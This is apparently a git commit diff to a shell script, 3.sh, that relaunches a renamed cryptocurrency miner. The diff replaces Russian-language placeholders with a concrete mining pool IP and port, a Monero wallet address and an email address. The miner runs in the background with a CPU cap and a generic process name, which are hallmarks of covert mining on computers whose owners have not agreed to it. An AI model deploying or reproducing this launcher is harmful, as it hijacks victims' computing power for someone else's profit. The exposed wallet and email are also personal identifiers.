de706f3052adc1139fb5a4f2c61a0106f420e835
alex13932 <59222267+alex13932@users.noreply.github.com>
2019-12-25 17:27:43 +0800

    Update 3.sh

--- 3.sh
+++ 3.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o ВАШ ИП:ПОРТ -u ВАШ КОШЕЛЁК МОНЕРО --pass=x:ВАША ПОЧТА --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=83 --av=1
+defaultsoftwarename -o 194.127.178.239:49228 -u 44GVqaMTxYULCkme3CwT8YNxLcxkPdykmM5ZaGafUbAe3gM93d18vAJPVZzi1udDmjHPUD992fbSUKZfAPCk7uBm85meS4n --pass=x:velat313@mail.ru --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=83 --av=1
